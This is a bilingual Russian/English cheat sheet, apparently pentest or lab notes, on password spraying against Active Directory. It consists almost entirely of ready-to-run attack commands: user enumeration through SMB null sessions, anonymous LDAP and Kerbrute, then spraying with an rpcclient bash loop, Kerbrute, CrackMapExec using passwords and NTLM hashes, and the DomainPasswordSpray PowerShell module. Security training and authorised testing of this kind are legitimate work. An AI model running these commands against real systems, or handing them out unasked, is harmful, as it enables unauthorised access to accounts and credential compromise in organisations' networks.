# Password Spraying 

**RU:**
Passsword Spraying  - это атака на каналы аутентификации, где злоумышленник, о котором идет речь, берет огромное количество имен пользователей и один пароль, а затем пробует каждое из этих имен пользователей, пока одно из них не будет подобрано верно<br>
**EN:**
Password Spraying - is an attack on authentication channels, where the attacker in question takes a huge number of usernames and one password, and then tries each of these usernames until one of them is picked up correctly<br>

**RU:**Как собрать имена пользователей, если нет авторизационных данных? Вот что можно сделать для этого.<br>
**EN:**How do you collect user names if there are no credentials? Here's what you can do to do it.<br>

# SMB NULL Session to Pull User List

Using enum4linux
```
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

Using rpcclient
```
rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers
```

Using Crackmapexec 
```
crackmapexec smb 172.16.5.5 --users
```

Gathering Users with LDAP Anonymous
```
ldapsearch -h 172.16.5.5 -x -b "DC=DOMAIN,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

Using windapsearch
```
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

Enumerating Users with Kerbrute
```
kerbrute userenum -d domain.local --dc 172.16.5.5 /usr/share/seclists/Usernames/Names/names.txt
```

# Credentialed Enumeration to Build our User List

Crackmapexec
```
crackmapexec smb 172.16.5.5 -u administartor -p Password@123! --users
```

Impacket
```
sudo impacket-GetADUsers -all domain.local/administartor:'Password@123!'
```

**RU:**После того как мы собрали список пользователей, теперь можем эксплуатировать атаку Password-Spraying, для Linux и Windows<br>
**EN:**Once we have collected the list of users, we can now exploit the Password-Spraying attack, for Linux and Windows<br>

## Linux 

Using a Bash one-liner for the Attack rpcclient
```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Password@1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

Using Kerbrute for the Attack
```
kerbrute passwordspray -d domain.local --dc 172.16.5.5 valid_users.txt  Password@123!
```

Using CrackMapExec & Filtering Logon Failures
```
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password@123! | grep +
```

## Password spraying wth NTLM Hash

Local administrator NTLM Hash Password spraying
```
sudo crackmapexec smb --local-auth 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

Domain Users NTLM Hash Password spraying 
```
sudo crackmapexec smb --local-auth 172.16.5.5 -u willaym -d DOMAIN.LOCAL -H 88ad09182de639ccc6579eb0849751cf | grep +
```
# Windows

**RU:**Следующая команда автоматически создаст список пользователей из домена текущего пользователя и попытается аутентифицироваться, используя каждое имя пользователя и пароль Welcome1.<br>
**EN:**The following command will automatically create a list of users from the current user's domain and attempt to authenticate using each Welcome1 username and password.<br>

```
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```